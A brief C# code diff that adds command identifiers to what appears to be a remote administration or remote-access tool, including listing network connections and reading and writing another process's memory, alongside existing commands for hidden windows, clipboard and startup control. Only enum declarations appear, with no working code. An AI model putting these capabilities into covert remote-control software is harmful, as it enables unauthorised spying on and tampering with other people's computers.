@@ -20,7 +20,14 @@
         Console,
         HideWindow,
         Clipboard,
-        StartupManager
+        StartupManager,
+        Connections
+    }
+
+    public enum ConnectionsCommand : byte
+    {
+        GetTable,
+        Table
     }
 
     public enum StartupManagerCommand : byte
@@ -72,7 +79,13 @@
     public enum TaskManagerCommand : byte
     {
         GetProcesses,
-        ProcessList
+        ProcessList,
+        WriteMemory,
+        ReadMemory,
+        GetModules,
+        InvalidProcess,
+        ModuleResponce,
+        MemoryValue
     }
 
     public enum RegistryCommand : byte
